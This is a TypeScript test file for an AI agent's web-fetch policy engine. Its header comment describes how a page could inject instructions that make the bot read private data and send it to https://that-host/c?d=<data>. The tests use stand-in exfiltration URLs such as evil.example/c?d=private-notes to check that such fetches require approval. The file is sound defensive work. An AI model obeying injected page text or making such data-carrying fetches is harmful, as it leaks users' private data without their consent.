/**
 * F3 (Sprint 5 hotfix): the owner asking the bot to read a page made that page's host, and every subdomain of it, a free
 * destination for the rest of a tainted run. The page could then tell the bot to read private data and fetch
 * https://that-host/c?d=<data> with no card. A host the owner named to read is now free only for the exact URL they wrote
 * or its front page; bare words name a host only when they look like one.
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { decide } from "../src/policy/engine";
import { resetPolicyHooks } from "../src/policy/hooks";
import { noopAuditSink, setAuditSink } from "../src/policy/audit-sink";
import { addTaint } from "../src/policy/context";
import { hostsNamedIn, ownerNamed, urlsNamedIn } from "../src/policy/egress";
import { normaliseURL } from "../src/policy/resources";
import type { Decision, RunContext } from "../src/policy/types";
import { policyRig, type PolicyRig } from "./policy-fixture";

let rig: PolicyRig;
beforeEach(() => { rig = policyRig(); });
afterEach(() => { rig.close(); resetPolicyHooks(); setAuditSink(noopAuditSink); });

const act = (run: RunContext, tool: string, args: Record<string, unknown>): Decision => decide(run, { tool, args, callID: "call_f3" });
const tainted = (run: RunContext): RunContext => { addTaint(run, { kind: "web", label: "evil.example/post", tool: "web_fetch", at: "2026-11-18T10:00:00Z" }); return run; };
const OWNER = ["summarize https://evil.example/post for me"];

describe("normaliseURL", () => {
  test("keeps http(s) URLs without the fragment, host lower-cased", () => {
    expect(normaliseURL("HTTPS://Evil.Example/Post#top")).toBe("https://evil.example/Post");
    expect(normaliseURL("https://evil.example")).toBe("https://evil.example/");
    expect(normaliseURL("ftp://evil.example/x")).toBeNull();
    expect(normaliseURL("not a url")).toBeNull();
  });
});

describe("a tainted run's fetch to a host the owner named to read", () => {
  test("the exact URL the owner wrote runs free", () => {
    const run = tainted(rig.another({ ownerText: OWNER }));
    expect(act(run, "web_fetch", { url: "https://evil.example/post" }).action).toBe("run");
    expect(act(run, "web_fetch", { url: "https://evil.example/post#comments" }).action).toBe("run");
  });

  test("the same host with data in the query asks, and the card names the whole URL", () => {
    const run = tainted(rig.another({ ownerText: OWNER }));
    const decision = act(run, "web_fetch", { url: "https://evil.example/c?d=private-notes" });
    expect(decision.action).toBe("ask");
    if (decision.action === "ask") expect(decision.card.unnamedDestinations).toEqual(["https://evil.example/c?d=private-notes"]);
  });

  test("the same host with data in the path asks", () => {
    const run = tainted(rig.another({ ownerText: OWNER }));
    expect(act(run, "web_fetch", { url: "https://evil.example/post/private-notes" }).action).toBe("ask");
    expect(act(run, "web_fetch", { url: "https://evil.example/post?x=1" }).action).toBe("ask");
  });

  test("a subdomain of a named host asks", () => {
    const run = tainted(rig.another({ ownerText: OWNER }));
    expect(act(run, "web_fetch", { url: "https://collect.evil.example/post" }).action).toBe("ask");
  });

  test("link_save is judged the same way", () => {
    const run = tainted(rig.another({ ownerText: OWNER }));
    expect(act(run, "link_save", { url: "https://evil.example/post" }).action).toBe("run");
    expect(act(run, "link_save", { url: "https://evil.example/c?d=private-notes" }).action).toBe("ask");
  });

  test("the front page of a host the owner wrote runs free; nothing else on it does", () => {
    const run = tainted(rig.another({ ownerText: ["have a look at www.example.org"] }));
    expect(act(run, "web_fetch", { url: "https://www.example.org/" }).action).toBe("run");
    expect(act(run, "web_fetch", { url: "https://www.example.org/?q=1" }).action).toBe("ask");
    expect(act(run, "web_fetch", { url: "https://www.example.org/page" }).action).toBe("ask");
  });

  test("a URL that does not parse never runs free", () => {
    const run = tainted(rig.another({ ownerText: OWNER }));
    expect(act(run, "web_fetch", { url: "https://evil.example:99999/x" }).action).not.toBe("run");
  });

  test("a clean run still fetches anything free", () => {
    expect(act(rig.another({ ownerText: OWNER }), "web_fetch", { url: "https://evil.example/c?d=x" }).action).toBe("run");
  });

  test("the approved-destinations list still covers a host and its subdomains, any path", () => {
    rig.db.run("INSERT INTO policy_settings (key, value, updated_at) VALUES ('approved_destinations', ?, ?)", [JSON.stringify(["partner.example"]), new Date().toISOString()]);
    const run = tainted(rig.another());
    expect(act(run, "web_fetch", { url: "https://www.partner.example/a?b=c" }).action).toBe("run");
  });
});

describe("what the owner's words name", () => {
  test("bare words that only look like file names are not hosts", () => {
    expect([...hostsNamedIn(["run install.sh then open readme.md and notes.txt"])]).toEqual([]);
  });

  test("a bare host counts with www. or a path after it, and as a URL when it has a path", () => {
    expect([...hostsNamedIn(["see www.example.org and docs.example.net/guide, not plain.example"])].sort()).toEqual(["docs.example.net", "www.example.org"]);
    const urls = urlsNamedIn(["see docs.example.net/guide."]);
    expect(urls.has("https://docs.example.net/guide")).toBe(true);
    expect(urls.has("http://docs.example.net/guide")).toBe(true);
  });

  test("URLs with a scheme are named exactly, trailing punctuation dropped", () => {
    expect([...urlsNamedIn(["read https://evil.example/post, then https://a.example/x?y=1."])].sort()).toEqual(["https://a.example/x?y=1", "https://evil.example/post"]);
  });

  test("a host destination is named only by its exact host", () => {
    const run = { ownerText: OWNER };
    expect(ownerNamed(run, { kind: "host", value: "evil.example" }, [])).toBe(true);
    expect(ownerNamed(run, { kind: "host", value: "collect.evil.example" }, [])).toBe(false);
  });
});
